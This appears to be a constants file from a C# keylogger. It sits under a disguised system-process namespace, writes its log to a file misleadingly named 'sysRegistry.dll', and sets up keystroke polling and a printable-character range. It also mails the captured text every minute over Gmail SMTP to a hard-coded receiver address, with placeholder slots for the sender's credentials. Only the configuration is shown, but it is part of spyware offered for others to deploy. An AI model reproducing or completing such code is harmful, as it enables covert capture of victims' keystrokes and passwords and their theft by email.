using System;

namespace SysMainProcess
{
    partial class SysMainProcess
    {
        private const short KS_DETECT = -32767;
        private const ushort SMTP_PORT = 587 /*Default for Gmail*/;
        private const uint PODCAST_INTERVAL = 60000 * 1;
        private static readonly string[] PODCAST_EMISSOR_CREDENTIALS = { "$YOUR SMTP MAIL", "$YOUR PASSWORD HERE" };
        private const string PODCAST_RECEIVER = "andaracabaj@gmail.com";
        private const ushort THREAD_SLEEP_TIME = 5;
        private const ushort MIN_ASCII_CODE = 32;
        private const ushort MAX_ASCII_CODE = 128;
        private const string REGISTRY_FILE_NAME = "sysRegistry.dll";
    }
}
